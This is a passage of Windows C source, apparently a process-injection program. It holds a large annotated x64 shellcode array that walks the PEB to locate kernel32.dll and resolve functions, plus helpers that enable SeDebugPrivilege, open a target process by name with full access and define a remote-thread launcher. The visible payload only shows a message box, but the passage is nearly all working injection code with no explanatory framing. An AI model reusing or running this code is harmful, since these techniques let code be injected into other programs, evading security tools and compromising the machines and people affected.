	/* 0335 */ "\xc7\x04\x24\x00\x00\x00\x00"                     /* mov dword [rsp], 0x0                     */
	/* 033C */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 033F */ "\x48\x83\xc4\x18"                                 /* add rsp, 0x18                            */
	/* 0343 */ "\xc3"                                             /* ret                                      */
	/* 0344 */ "\xcc"                                             /* int3                                     */
	/* 0345 */ "\xcc"                                             /* int3                                     */
	/* 0346 */ "\xcc"                                             /* int3                                     */
	/* 0347 */ "\xcc"                                             /* int3                                     */
	/* 0348 */ "\xcc"                                             /* int3                                     */
	/* 0349 */ "\xcc"                                             /* int3                                     */
	/* 034A */ "\xcc"                                             /* int3                                     */
	/* 034B */ "\xcc"                                             /* int3                                     */
	/* 034C */ "\xcc"                                             /* int3                                     */
	/* 034D */ "\xcc"                                             /* int3                                     */
	/* 034E */ "\xcc"                                             /* int3                                     */
	/* 034F */ "\xcc"                                             /* int3                                     */
	/* 0350 */ "\x88\x4c\x24\x08"                                 /* mov [rsp+0x8], cl                        */
	/* 0354 */ "\x48\x83\xec\x38"                                 /* sub rsp, 0x38                            */
	/* 0358 */ "\x0f\xb6\x4c\x24\x40"                             /* movzx ecx, byte [rsp+0x40]               */
	/* 035D */ "\xe8\xae\xff\xff\xff"                             /* call 0x310                               */
	/* 0362 */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0364 */ "\x74\x0e"                                         /* jz 0x374                                 */
	/* 0366 */ "\x0f\xbe\x44\x24\x40"                             /* movsx eax, byte [rsp+0x40]               */
	/* 036B */ "\x83\xc0\x20"                                     /* add eax, 0x20                            */
	/* 036E */ "\x89\x44\x24\x20"                                 /* mov [rsp+0x20], eax                      */
	/* 0372 */ "\xeb\x09"                                         /* jmp 0x37d                                */
	/* 0374 */ "\x0f\xbe\x44\x24\x40"                             /* movsx eax, byte [rsp+0x40]               */
	/* 0379 */ "\x89\x44\x24\x20"                                 /* mov [rsp+0x20], eax                      */
	/* 037D */ "\x0f\xb6\x44\x24\x20"                             /* movzx eax, byte [rsp+0x20]               */
	/* 0382 */ "\x48\x83\xc4\x38"                                 /* add rsp, 0x38                            */
	/* 0386 */ "\xc3"                                             /* ret                                      */
	/* 0387 */ "\xcc"                                             /* int3                                     */
	/* 0388 */ "\xcc"                                             /* int3                                     */
	/* 0389 */ "\xcc"                                             /* int3                                     */
	/* 038A */ "\xcc"                                             /* int3                                     */
	/* 038B */ "\xcc"                                             /* int3                                     */
	/* 038C */ "\xcc"                                             /* int3                                     */
	/* 038D */ "\xcc"                                             /* int3                                     */
	/* 038E */ "\xcc"                                             /* int3                                     */
	/* 038F */ "\xcc"                                             /* int3                                     */
	/* 0390 */ "\x48\x89\x4c\x24\x08"                             /* mov [rsp+0x8], rcx                       */
	/* 0395 */ "\x48\x83\xec\x18"                                 /* sub rsp, 0x18                            */
	/* 0399 */ "\xc7\x04\x24\x00\x00\x00\x00"                     /* mov dword [rsp], 0x0                     */
	/* 03A0 */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 03A3 */ "\x48\x8b\x4c\x24\x20"                             /* mov rcx, [rsp+0x20]                      */
	/* 03A8 */ "\x0f\xb7\x04\x41"                                 /* movzx eax, word [rcx+rax*2]              */
	/* 03AC */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 03AE */ "\x74\x0a"                                         /* jz 0x3ba                                 */
	/* 03B0 */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 03B3 */ "\xff\xc0"                                         /* inc eax                                  */
	/* 03B5 */ "\x89\x04\x24"                                     /* mov [rsp], eax                           */
	/* 03B8 */ "\xeb\xe6"                                         /* jmp 0x3a0                                */
	/* 03BA */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 03BD */ "\x48\x83\xc4\x18"                                 /* add rsp, 0x18                            */
	/* 03C1 */ "\xc3"                                             /* ret                                      */
	/* 03C2 */ "\xcc"                                             /* int3                                     */
	/* 03C3 */ "\xcc"                                             /* int3                                     */
	/* 03C4 */ "\xcc"                                             /* int3                                     */
	/* 03C5 */ "\xcc"                                             /* int3                                     */
	/* 03C6 */ "\xcc"                                             /* int3                                     */
	/* 03C7 */ "\xcc"                                             /* int3                                     */
	/* 03C8 */ "\xcc"                                             /* int3                                     */
	/* 03C9 */ "\xcc"                                             /* int3                                     */
	/* 03CA */ "\xcc"                                             /* int3                                     */
	/* 03CB */ "\xcc"                                             /* int3                                     */
	/* 03CC */ "\xcc"                                             /* int3                                     */
	/* 03CD */ "\xcc"                                             /* int3                                     */
	/* 03CE */ "\xcc"                                             /* int3                                     */
	/* 03CF */ "\xcc"                                             /* int3                                     */
	/* 03D0 */ "\x48\x89\x54\x24\x10"                             /* mov [rsp+0x10], rdx                      */
	/* 03D5 */ "\x48\x89\x4c\x24\x08"                             /* mov [rsp+0x8], rcx                       */
	/* 03DA */ "\x48\x83\xec\x38"                                 /* sub rsp, 0x38                            */
	/* 03DE */ "\xb8\x01\x00\x00\x00"                             /* mov eax, 0x1                             */
	/* 03E3 */ "\x48\x6b\xc0\x00"                                 /* imul rax, rax, 0x0                       */
	/* 03E7 */ "\x48\x8b\x4c\x24\x48"                             /* mov rcx, [rsp+0x48]                      */
	/* 03EC */ "\x0f\xb6\x04\x01"                                 /* movzx eax, byte [rcx+rax]                */
	/* 03F0 */ "\x88\x44\x24\x22"                                 /* mov [rsp+0x22], al                       */
	/* 03F4 */ "\x0f\xb6\x4c\x24\x22"                             /* movzx ecx, byte [rsp+0x22]               */
	/* 03F9 */ "\xe8\x52\xff\xff\xff"                             /* call 0x350                               */
	/* 03FE */ "\x88\x44\x24\x21"                                 /* mov [rsp+0x21], al                       */
	/* 0402 */ "\x48\x8b\x44\x24\x48"                             /* mov rax, [rsp+0x48]                      */
	/* 0407 */ "\x48\x83\xc0\x02"                                 /* add rax, 0x2                             */
	/* 040B */ "\x48\x89\x44\x24\x48"                             /* mov [rsp+0x48], rax                      */
	/* 0410 */ "\x0f\xbe\x44\x24\x21"                             /* movsx eax, byte [rsp+0x21]               */
	/* 0415 */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0417 */ "\x75\x07"                                         /* jnz 0x420                                */
	/* 0419 */ "\x48\x8b\x44\x24\x40"                             /* mov rax, [rsp+0x40]                      */
	/* 041E */ "\xeb\x7c"                                         /* jmp 0x49c                                */
	/* 0420 */ "\x48\x8b\x4c\x24\x48"                             /* mov rcx, [rsp+0x48]                      */
	/* 0425 */ "\xe8\x66\xff\xff\xff"                             /* call 0x390                               */
	/* 042A */ "\x89\x44\x24\x24"                                 /* mov [rsp+0x24], eax                      */
	/* 042E */ "\xb8\x01\x00\x00\x00"                             /* mov eax, 0x1                             */
	/* 0433 */ "\x48\x6b\xc0\x00"                                 /* imul rax, rax, 0x0                       */
	/* 0437 */ "\x48\x8b\x4c\x24\x40"                             /* mov rcx, [rsp+0x40]                      */
	/* 043C */ "\x0f\xb6\x04\x01"                                 /* movzx eax, byte [rcx+rax]                */
	/* 0440 */ "\x88\x44\x24\x23"                                 /* mov [rsp+0x23], al                       */
	/* 0444 */ "\x0f\xb6\x4c\x24\x23"                             /* movzx ecx, byte [rsp+0x23]               */
	/* 0449 */ "\xe8\x02\xff\xff\xff"                             /* call 0x350                               */
	/* 044E */ "\x88\x44\x24\x20"                                 /* mov [rsp+0x20], al                       */
	/* 0452 */ "\x48\x8b\x44\x24\x40"                             /* mov rax, [rsp+0x40]                      */
	/* 0457 */ "\x48\x83\xc0\x02"                                 /* add rax, 0x2                             */
	/* 045B */ "\x48\x89\x44\x24\x40"                             /* mov [rsp+0x40], rax                      */
	/* 0460 */ "\x0f\xbe\x44\x24\x20"                             /* movsx eax, byte [rsp+0x20]               */
	/* 0465 */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0467 */ "\x75\x04"                                         /* jnz 0x46d                                */
	/* 0469 */ "\x33\xc0"                                         /* xor eax, eax                             */
	/* 046B */ "\xeb\x2f"                                         /* jmp 0x49c                                */
	/* 046D */ "\x0f\xbe\x44\x24\x20"                             /* movsx eax, byte [rsp+0x20]               */
	/* 0472 */ "\x0f\xbe\x4c\x24\x21"                             /* movsx ecx, byte [rsp+0x21]               */
	/* 0477 */ "\x3b\xc1"                                         /* cmp eax, ecx                             */
	/* 0479 */ "\x75\xb3"                                         /* jnz 0x42e                                */
	/* 047B */ "\x44\x8b\x44\x24\x24"                             /* mov r8d, [rsp+0x24]                      */
	/* 0480 */ "\x48\x8b\x54\x24\x48"                             /* mov rdx, [rsp+0x48]                      */
	/* 0485 */ "\x48\x8b\x4c\x24\x40"                             /* mov rcx, [rsp+0x40]                      */
	/* 048A */ "\xe8\x21\x00\x00\x00"                             /* call 0x4b0                               */
	/* 048F */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0491 */ "\x75\x9b"                                         /* jnz 0x42e                                */
	/* 0493 */ "\x48\x8b\x44\x24\x40"                             /* mov rax, [rsp+0x40]                      */
	/* 0498 */ "\x48\x83\xe8\x02"                                 /* sub rax, 0x2                             */
	/* 049C */ "\x48\x83\xc4\x38"                                 /* add rsp, 0x38                            */
	/* 04A0 */ "\xc3"                                             /* ret                                      */
	/* 04A1 */ "\xcc"                                             /* int3                                     */
	/* 04A2 */ "\xcc"                                             /* int3                                     */
	/* 04A3 */ "\xcc"                                             /* int3                                     */
	/* 04A4 */ "\xcc"                                             /* int3                                     */
	/* 04A5 */ "\xcc"                                             /* int3                                     */
	/* 04A6 */ "\xcc"                                             /* int3                                     */
	/* 04A7 */ "\xcc"                                             /* int3                                     */
	/* 04A8 */ "\xcc"                                             /* int3                                     */
	/* 04A9 */ "\xcc"                                             /* int3                                     */
	/* 04AA */ "\xcc"                                             /* int3                                     */
	/* 04AB */ "\xcc"                                             /* int3                                     */
	/* 04AC */ "\xcc"                                             /* int3                                     */
	/* 04AD */ "\xcc"                                             /* int3                                     */
	/* 04AE */ "\xcc"                                             /* int3                                     */
	/* 04AF */ "\xcc"                                             /* int3                                     */
	/* 04B0 */ "\x44\x89\x44\x24\x18"                             /* mov [rsp+0x18], r8d                      */
	/* 04B5 */ "\x48\x89\x54\x24\x10"                             /* mov [rsp+0x10], rdx                      */
	/* 04BA */ "\x48\x89\x4c\x24\x08"                             /* mov [rsp+0x8], rcx                       */
	/* 04BF */ "\x48\x83\xec\x38"                                 /* sub rsp, 0x38                            */
	/* 04C3 */ "\x8b\x44\x24\x50"                                 /* mov eax, [rsp+0x50]                      */
	/* 04C7 */ "\xff\xc8"                                         /* dec eax                                  */
	/* 04C9 */ "\x89\x44\x24\x50"                                 /* mov [rsp+0x50], eax                      */
	/* 04CD */ "\xb8\x01\x00\x00\x00"                             /* mov eax, 0x1                             */
	/* 04D2 */ "\x48\x6b\xc0\x00"                                 /* imul rax, rax, 0x0                       */
	/* 04D6 */ "\x48\x8b\x4c\x24\x40"                             /* mov rcx, [rsp+0x40]                      */
	/* 04DB */ "\x0f\xb6\x04\x01"                                 /* movzx eax, byte [rcx+rax]                */
	/* 04DF */ "\x88\x44\x24\x20"                                 /* mov [rsp+0x20], al                       */
	/* 04E3 */ "\x48\x8b\x44\x24\x40"                             /* mov rax, [rsp+0x40]                      */
	/* 04E8 */ "\x48\x83\xc0\x02"                                 /* add rax, 0x2                             */
	/* 04EC */ "\x48\x89\x44\x24\x40"                             /* mov [rsp+0x40], rax                      */
	/* 04F1 */ "\xb8\x01\x00\x00\x00"                             /* mov eax, 0x1                             */
	/* 04F6 */ "\x48\x6b\xc0\x00"                                 /* imul rax, rax, 0x0                       */
	/* 04FA */ "\x48\x8b\x4c\x24\x48"                             /* mov rcx, [rsp+0x48]                      */
	/* 04FF */ "\x0f\xb6\x04\x01"                                 /* movzx eax, byte [rcx+rax]                */
	/* 0503 */ "\x88\x44\x24\x21"                                 /* mov [rsp+0x21], al                       */
	/* 0507 */ "\x48\x8b\x44\x24\x48"                             /* mov rax, [rsp+0x48]                      */
	/* 050C */ "\x48\x83\xc0\x02"                                 /* add rax, 0x2                             */
	/* 0510 */ "\x48\x89\x44\x24\x48"                             /* mov [rsp+0x48], rax                      */
	/* 0515 */ "\x0f\xb6\x4c\x24\x20"                             /* movzx ecx, byte [rsp+0x20]               */
	/* 051A */ "\xe8\x31\xfe\xff\xff"                             /* call 0x350                               */
	/* 051F */ "\x0f\xbe\xc0"                                     /* movsx eax, al                            */
	/* 0522 */ "\x89\x44\x24\x28"                                 /* mov [rsp+0x28], eax                      */
	/* 0526 */ "\x0f\xb6\x4c\x24\x21"                             /* movzx ecx, byte [rsp+0x21]               */
	/* 052B */ "\xe8\x20\xfe\xff\xff"                             /* call 0x350                               */
	/* 0530 */ "\x0f\xbe\xc0"                                     /* movsx eax, al                            */
	/* 0533 */ "\x8b\x4c\x24\x28"                                 /* mov ecx, [rsp+0x28]                      */
	/* 0537 */ "\x2b\xc8"                                         /* sub ecx, eax                             */
	/* 0539 */ "\x8b\xc1"                                         /* mov eax, ecx                             */
	/* 053B */ "\x89\x44\x24\x24"                                 /* mov [rsp+0x24], eax                      */
	/* 053F */ "\x83\x7c\x24\x24\x00"                             /* cmp dword [rsp+0x24], 0x0                */
	/* 0544 */ "\x75\x1d"                                         /* jnz 0x563                                */
	/* 0546 */ "\x0f\xbe\x44\x24\x20"                             /* movsx eax, byte [rsp+0x20]               */
	/* 054B */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 054D */ "\x74\x14"                                         /* jz 0x563                                 */
	/* 054F */ "\x0f\xbe\x44\x24\x21"                             /* movsx eax, byte [rsp+0x21]               */
	/* 0554 */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0556 */ "\x74\x0b"                                         /* jz 0x563                                 */
	/* 0558 */ "\x83\x7c\x24\x50\x00"                             /* cmp dword [rsp+0x50], 0x0                */
	/* 055D */ "\x0f\x87\x60\xff\xff\xff"                         /* ja 0x4c3                                 */
	/* 0563 */ "\x8b\x44\x24\x24"                                 /* mov eax, [rsp+0x24]                      */
	/* 0567 */ "\x48\x83\xc4\x38"                                 /* add rsp, 0x38                            */
	/* 056B */ "\xc3"                                             /* ret                                      */
	/* 056C */ "\xcc"                                             /* int3                                     */
	/* 056D */ "\xcc"                                             /* int3                                     */
	/* 056E */ "\xcc"                                             /* int3                                     */
	/* 056F */ "\xcc"                                             /* int3                                     */
	/* 0570 */ "\x44\x89\x44\x24\x18"                             /* mov [rsp+0x18], r8d                      */
	/* 0575 */ "\x48\x89\x54\x24\x10"                             /* mov [rsp+0x10], rdx                      */
	/* 057A */ "\x48\x89\x4c\x24\x08"                             /* mov [rsp+0x8], rcx                       */
	/* 057F */ "\x48\x83\xec\x28"                                 /* sub rsp, 0x28                            */
	/* 0583 */ "\x48\x8b\x44\x24\x38"                             /* mov rax, [rsp+0x38]                      */
	/* 0588 */ "\x48\x89\x44\x24\x10"                             /* mov [rsp+0x10], rax                      */
	/* 058D */ "\x48\x8b\x44\x24\x30"                             /* mov rax, [rsp+0x30]                      */
	/* 0592 */ "\x48\x89\x44\x24\x08"                             /* mov [rsp+0x8], rax                       */
	/* 0597 */ "\x8b\x44\x24\x40"                                 /* mov eax, [rsp+0x40]                      */
	/* 059B */ "\x89\x04\x24"                                     /* mov [rsp], eax                           */
	/* 059E */ "\x8b\x44\x24\x40"                                 /* mov eax, [rsp+0x40]                      */
	/* 05A2 */ "\xff\xc8"                                         /* dec eax                                  */
	/* 05A4 */ "\x89\x44\x24\x40"                                 /* mov [rsp+0x40], eax                      */
	/* 05A8 */ "\x83\x3c\x24\x00"                                 /* cmp dword [rsp], 0x0                     */
	/* 05AC */ "\x74\x2b"                                         /* jz 0x5d9                                 */
	/* 05AE */ "\x48\x8b\x44\x24\x08"                             /* mov rax, [rsp+0x8]                       */
	/* 05B3 */ "\x48\x8b\x4c\x24\x10"                             /* mov rcx, [rsp+0x10]                      */
	/* 05B8 */ "\x0f\xb6\x09"                                     /* movzx ecx, byte [rcx]                    */
	/* 05BB */ "\x88\x08"                                         /* mov [rax], cl                            */
	/* 05BD */ "\x48\x8b\x44\x24\x08"                             /* mov rax, [rsp+0x8]                       */
	/* 05C2 */ "\x48\xff\xc0"                                     /* inc rax                                  */
	/* 05C5 */ "\x48\x89\x44\x24\x08"                             /* mov [rsp+0x8], rax                       */
	/* 05CA */ "\x48\x8b\x44\x24\x10"                             /* mov rax, [rsp+0x10]                      */
	/* 05CF */ "\x48\xff\xc0"                                     /* inc rax                                  */
	/* 05D2 */ "\x48\x89\x44\x24\x10"                             /* mov [rsp+0x10], rax                      */
	/* 05D7 */ "\xeb\xbe"                                         /* jmp 0x597                                */
	/* 05D9 */ "\x48\x8b\x44\x24\x30"                             /* mov rax, [rsp+0x30]                      */
	/* 05DE */ "\x48\x83\xc4\x28"                                 /* add rsp, 0x28                            */
	/* 05E2 */ "\xc3"                                             /* ret                                      */
	/* 05E3 */ "\xcc"                                             /* int3                                     */
	/* 05E4 */ "\xcc"                                             /* int3                                     */
	/* 05E5 */ "\xcc"                                             /* int3                                     */
	/* 05E6 */ "\xcc"                                             /* int3                                     */
	/* 05E7 */ "\xcc"                                             /* int3                                     */
	/* 05E8 */ "\xcc"                                             /* int3                                     */
	/* 05E9 */ "\xcc"                                             /* int3                                     */
	/* 05EA */ "\xcc"                                             /* int3                                     */
	/* 05EB */ "\xcc"                                             /* int3                                     */
	/* 05EC */ "\xcc"                                             /* int3                                     */
	/* 05ED */ "\xcc"                                             /* int3                                     */
	/* 05EE */ "\xcc"                                             /* int3                                     */
	/* 05EF */ "\xcc"                                             /* int3                                     */
	/* 05F0 */ "\x48\x89\x4c\x24\x08"                             /* mov [rsp+0x8], rcx                       */
	/* 05F5 */ "\x48\x83\xec\x18"                                 /* sub rsp, 0x18                            */
	/* 05F9 */ "\xc7\x04\x24\x00\x00\x00\x00"                     /* mov dword [rsp], 0x0                     */
	/* 0600 */ "\x48\x8b\x44\x24\x20"                             /* mov rax, [rsp+0x20]                      */
	/* 0605 */ "\x48\x89\x44\x24\x08"                             /* mov [rsp+0x8], rax                       */
	/* 060A */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 060D */ "\xc1\xe0\x07"                                     /* shl eax, 0x7                             */
	/* 0610 */ "\x8b\x0c\x24"                                     /* mov ecx, [rsp]                           */
	/* 0613 */ "\xc1\xe9\x19"                                     /* shr ecx, 0x19                            */
	/* 0616 */ "\x03\xc1"                                         /* add eax, ecx                             */
	/* 0618 */ "\x48\x8b\x4c\x24\x08"                             /* mov rcx, [rsp+0x8]                       */
	/* 061D */ "\x0f\xb6\x09"                                     /* movzx ecx, byte [rcx]                    */
	/* 0620 */ "\x03\xc1"                                         /* add eax, ecx                             */
	/* 0622 */ "\x89\x04\x24"                                     /* mov [rsp], eax                           */
	/* 0625 */ "\x48\x8b\x44\x24\x08"                             /* mov rax, [rsp+0x8]                       */
	/* 062A */ "\x0f\xb6\x00"                                     /* movzx eax, byte [rax]                    */
	/* 062D */ "\x89\x44\x24\x04"                                 /* mov [rsp+0x4], eax                       */
	/* 0631 */ "\x48\x8b\x44\x24\x08"                             /* mov rax, [rsp+0x8]                       */
	/* 0636 */ "\x48\xff\xc0"                                     /* inc rax                                  */
	/* 0639 */ "\x48\x89\x44\x24\x08"                             /* mov [rsp+0x8], rax                       */
	/* 063E */ "\x83\x7c\x24\x04\x00"                             /* cmp dword [rsp+0x4], 0x0                 */
	/* 0643 */ "\x75\xc5"                                         /* jnz 0x60a                                */
	/* 0645 */ "\x8b\x04\x24"                                     /* mov eax, [rsp]                           */
	/* 0648 */ "\x48\x83\xc4\x18"                                 /* add rsp, 0x18                            */
	/* 064C */ "\xc3"                                             /* ret                                      */
	/* 064D */ "\xcc"                                             /* int3                                     */
	/* 064E */ "\xcc"                                             /* int3                                     */
	/* 064F */ "\xcc"                                             /* int3                                     */
	/* 0650 */ "\x48\x81\xec\x88\x02\x00\x00"                     /* sub rsp, 0x288                           */
	/* 0657 */ "\x48\xc7\x44\x24\x60\xff\xff\xff\xff"             /* mov qword [rsp+0x60], 0xffffffffffffffff */
	/* 0660 */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00"             /* mov rax, [gs:0x60]                       */
	/* 0669 */ "\x48\x89\x44\x24\x68"                             /* mov [rsp+0x68], rax                      */
	/* 066E */ "\x48\x8b\x44\x24\x68"                             /* mov rax, [rsp+0x68]                      */
	/* 0673 */ "\x48\x8b\x40\x18"                                 /* mov rax, [rax+0x18]                      */
	/* 0677 */ "\x48\x83\xc0\x20"                                 /* add rax, 0x20                            */
	/* 067B */ "\x48\x89\x44\x24\x58"                             /* mov [rsp+0x58], rax                      */
	/* 0680 */ "\x48\x8b\x44\x24\x58"                             /* mov rax, [rsp+0x58]                      */
	/* 0685 */ "\x48\x8b\x00"                                     /* mov rax, [rax]                           */
	/* 0688 */ "\x48\x89\x44\x24\x30"                             /* mov [rsp+0x30], rax                      */
	/* 068D */ "\xb8\x6b\x00\x00\x00"                             /* mov eax, 0x6b                            */
	/* 0692 */ "\x66\x89\x44\x24\x38"                             /* mov [rsp+0x38], ax                       */
	/* 0697 */ "\xb8\x65\x00\x00\x00"                             /* mov eax, 0x65                            */
	/* 069C */ "\x66\x89\x44\x24\x3a"                             /* mov [rsp+0x3a], ax                       */
	/* 06A1 */ "\xb8\x72\x00\x00\x00"                             /* mov eax, 0x72                            */
	/* 06A6 */ "\x66\x89\x44\x24\x3c"                             /* mov [rsp+0x3c], ax                       */
	/* 06AB */ "\xb8\x6e\x00\x00\x00"                             /* mov eax, 0x6e                            */
	/* 06B0 */ "\x66\x89\x44\x24\x3e"                             /* mov [rsp+0x3e], ax                       */
	/* 06B5 */ "\xb8\x65\x00\x00\x00"                             /* mov eax, 0x65                            */
	/* 06BA */ "\x66\x89\x44\x24\x40"                             /* mov [rsp+0x40], ax                       */
	/* 06BF */ "\xb8\x6c\x00\x00\x00"                             /* mov eax, 0x6c                            */
	/* 06C4 */ "\x66\x89\x44\x24\x42"                             /* mov [rsp+0x42], ax                       */
	/* 06C9 */ "\xb8\x33\x00\x00\x00"                             /* mov eax, 0x33                            */
	/* 06CE */ "\x66\x89\x44\x24\x44"                             /* mov [rsp+0x44], ax                       */
	/* 06D3 */ "\xb8\x32\x00\x00\x00"                             /* mov eax, 0x32                            */
	/* 06D8 */ "\x66\x89\x44\x24\x46"                             /* mov [rsp+0x46], ax                       */
	/* 06DD */ "\xb8\x2e\x00\x00\x00"                             /* mov eax, 0x2e                            */
	/* 06E2 */ "\x66\x89\x44\x24\x48"                             /* mov [rsp+0x48], ax                       */
	/* 06E7 */ "\xb8\x64\x00\x00\x00"                             /* mov eax, 0x64                            */
	/* 06EC */ "\x66\x89\x44\x24\x4a"                             /* mov [rsp+0x4a], ax                       */
	/* 06F1 */ "\xb8\x6c\x00\x00\x00"                             /* mov eax, 0x6c                            */
	/* 06F6 */ "\x66\x89\x44\x24\x4c"                             /* mov [rsp+0x4c], ax                       */
	/* 06FB */ "\xb8\x6c\x00\x00\x00"                             /* mov eax, 0x6c                            */
	/* 0700 */ "\x66\x89\x44\x24\x4e"                             /* mov [rsp+0x4e], ax                       */
	/* 0705 */ "\x33\xc0"                                         /* xor eax, eax                             */
	/* 0707 */ "\x66\x89\x44\x24\x50"                             /* mov [rsp+0x50], ax                       */
	/* 070C */ "\x48\x8b\x44\x24\x58"                             /* mov rax, [rsp+0x58]                      */
	/* 0711 */ "\x48\x39\x44\x24\x30"                             /* cmp [rsp+0x30], rax                      */
	/* 0716 */ "\x0f\x84\x8b\x00\x00\x00"                         /* jz 0x7a7                                 */
	/* 071C */ "\x48\x8b\x44\x24\x30"                             /* mov rax, [rsp+0x30]                      */
	/* 0721 */ "\x48\x83\xe8\x10"                                 /* sub rax, 0x10                            */
	/* 0725 */ "\x48\x89\x44\x24\x28"                             /* mov [rsp+0x28], rax                      */
	/* 072A */ "\x48\x8b\x44\x24\x28"                             /* mov rax, [rsp+0x28]                      */
	/* 072F */ "\x0f\xb7\x40\x48"                                 /* movzx eax, word [rax+0x48]               */
	/* 0733 */ "\x85\xc0"                                         /* test eax, eax                            */
	/* 0735 */ "\x74\x5e"                                         /* jz 0x795                                 */
	/* 0737 */ "\x48\x8b\x44\x24\x28"                             /* mov rax, [rsp+0x28]                      */
	/* 073C */ "\x0f\xb7\x40\x48"                                 /* movzx eax, word [rax+0x48]               */
	/* 0740 */ "\x89\x44\x24\x20"                                 /* mov [rsp+0x20], eax                      */
	/* 0744 */ "\x44\x8b\x44\x24\x20"                             /* mov r8d, [rsp+0x20]                      */
	/* 0749 */ "\x48\x8b\x44\x24\x28"                             /* mov rax, [rsp+0x28]                      */
	/* 074E */ "\x48\x8b\x50\x50"                                 /* mov rdx, [rax+0x50]                      */
	/* 0752 */ "\x48\x8d\x4c\x24\x70"                             /* lea rcx, [rsp+0x70]                      */
	/* 0757 */ "\xe8\x14\xfe\xff\xff"                             /* call 0x570                               */
	/* 075C */ "\x8b\x44\x24\x20"                                 /* mov eax, [rsp+0x20]                      */
	/* 0760 */ "\x33\xd2"                                         /* xor edx, edx                             */
	/* 0762 */ "\xb9\x02\x00\x00\x00"                             /* mov ecx, 0x2                             */
	/* 0767 */ "\x48\xf7\xf1"                                     /* div rcx                                  */
	/* 076A */ "\x33\xc9"                                         /* xor ecx, ecx                             */
	/* 076C */ "\x66\x89\x4c\x44\x70"                             /* mov [rsp+rax*2+0x70], cx                 */
	/* 0771 */ "\x48\x8d\x54\x24\x38"                             /* lea rdx, [rsp+0x38]                      */
	/* 0776 */ "\x48\x8d\x4c\x24\x70"                             /* lea rcx, [rsp+0x70]                      */
	/* 077B */ "\xe8\x50\xfc\xff\xff"                             /* call 0x3d0                               */
	/* 0780 */ "\x48\x85\xc0"                                     /* test rax, rax                            */
	/* 0783 */ "\x74\x10"                                         /* jz 0x795                                 */
	/* 0785 */ "\x48\x8b\x44\x24\x28"                             /* mov rax, [rsp+0x28]                      */
	/* 078A */ "\x48\x8b\x40\x30"                                 /* mov rax, [rax+0x30]                      */
	/* 078E */ "\x48\x89\x44\x24\x60"                             /* mov [rsp+0x60], rax                      */
	/* 0793 */ "\xeb\x12"                                         /* jmp 0x7a7                                */
	/* 0795 */ "\x48\x8b\x44\x24\x30"                             /* mov rax, [rsp+0x30]                      */
	/* 079A */ "\x48\x8b\x00"                                     /* mov rax, [rax]                           */
	/* 079D */ "\x48\x89\x44\x24\x30"                             /* mov [rsp+0x30], rax                      */
	/* 07A2 */ "\xe9\x65\xff\xff\xff"                             /* jmp 0x70c                                */
	/* 07A7 */ "\x48\x8b\x44\x24\x60"                             /* mov rax, [rsp+0x60]                      */
	/* 07AC */ "\x48\x81\xc4\x88\x02\x00\x00"                     /* add rsp, 0x288                           */
	/* 07B3 */ "\xc3"                                             /* ret                                      */
	/* 07B4 */ "\xcc"                                             /* int3                                     */
	/* 07B5 */ "\xcc"                                             /* int3                                     */
	/* 07B6 */ "\xcc"                                             /* int3                                     */
	/* 07B7 */ "\xcc"                                             /* int3                                     */
	/* 07B8 */ "\xcc"                                             /* int3                                     */
	/* 07B9 */ "\xcc"                                             /* int3                                     */
	/* 07BA */ "\xcc"                                             /* int3                                     */
	/* 07BB */ "\xcc"                                             /* int3                                     */
	/* 07BC */ "\xcc"                                             /* int3                                     */
	/* 07BD */ "\xcc"                                             /* int3                                     */
	/* 07BE */ "\xcc"                                             /* int3                                     */
	/* 07BF */ "\xcc"                                             /* int3                                     */
};
typedef struct _RemoteParam {
	char szMsg[12];    //MessageBox函数中显示的字符提示  
	DWORD dwMessageBox;//MessageBox函数的入口地址  
} RemoteParam, * PRemoteParam;
typedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
	DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);
//定义MessageBox类型的函数指针
typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);

DWORD __stdcall threadProc(LPVOID lParam)
{
	RemoteParam* pRP = (RemoteParam*)lParam;
	PFN_MESSAGEBOX pfnMessageBox;
	pfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;
	pfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);
	return 0;
}
bool enableDebugPriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return false;
	}
	return true;
}
HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe)) {
		MessageBoxA(NULL,
			"The frist entry of the process list has not been copyied to the buffer",
			"Notice", MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	while (Process32Next(hSnapshot, &pe)) {
		if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {
			return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
		}
	}
	return 0;
}
